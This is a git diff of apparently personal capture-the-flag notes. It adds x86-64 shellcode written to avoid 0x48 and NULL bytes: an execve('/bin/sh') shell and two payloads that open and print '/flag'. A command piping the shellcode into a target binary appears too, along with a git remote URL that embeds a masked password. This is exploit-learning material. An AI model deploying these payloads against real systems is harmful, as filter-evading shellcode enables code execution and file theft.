@@ -40,20 +40,82 @@ syscall				# trigger exit()
 + (cat shellcode-raw; cat) | ./blah
 
 
-# SH WITH NO MOV(0x48)
+# SH WITH NO LONG (R)SI(0x48)
 ```shell
 .global _start
 _start:
 .intel_syntax noprefix
 #int3
-add rax, 59             # this is the syscall number of execve
-lea rdi, [rip+binsh]    # points the first argument of execve at the /bin/sh string below
-xor rsi, rsi            # this makes the second argument, argv, NULL
-xor rdx, rdx            # this makes the third argument, envp, NULL
+add eax, 59             # this is the syscall number of execve
+lea edi, [rip+binsh]    # points the first argument of execve at the /bin/sh string below
+xor esi, esi            # this makes the second argument, argv, NULL
+xor edx, edx            # this makes the third argument, envp, NULL
 syscall                 # this triggers the system call
 binsh:                          # a label marking where the /bin/sh string is
 .string "/bin/sh"
 ```
+
+# FLAG READ WITH NO LONG (R)SI(0x48)
+```shell
+.global _start
+_start:
+.intel_syntax noprefix
+#int3
+lea edi, [rip+flag]    # points the first argument of execve at the /bin/sh string below
+mov eax, 2                              # syscall number of open
+mov esi, 0                              # NULL out the second argument (meaning, O_RDONLY)
+syscall
+mov edi, 1                              # first argument to sendfile is the file descriptor to output to (stdout)
+mov esi, eax                            # second argument is the file descriptor returned by open
+mov edx, 0                              # third argument is the number of bytes to skip from the input file
+mov r10, 1000                           # fourth argument is the number of bytes to transfer to the output file
+mov eax, 40                             # syscall number of sendfile
+syscall                         # trigger sendfile(1, fd, 0, 1000)
+mov eax, 60                             # syscall number of exit
+syscall                         # trigger exit()
+flag:
+.string "/flag"
+```
+
+# FLAG READ WITHOUT NULL
+```s
+.global _start
+_start:
+.intel_syntax noprefix
+#int3
+push 0x616C662F
+push 0x67
+pop rcx
+mov [rsp+4], ecx
+lea rdi, [rsp]
+xor rsi, rsi
+xor rax, rax
+inc rax
+inc rax
+syscall
+
+mov rbx, rax
+
+lea rsi, [rsp]
+mov rdi, rbx
+push 0x7f
+pop rdx
+xor rax, rax
+syscall
+
+lea rsi, [rsp]
+xor rdi, rdi
+inc rdi
+mov rdx, rax
+xor rax, rax
+inc rax
+syscall
+
+push 60
+pop rax
+syscall
+```
+
 
 # NEW GIT 
 + git remote set-url origin https://littlefoot22:********@github.com/littlefoot22/ctf-public.git
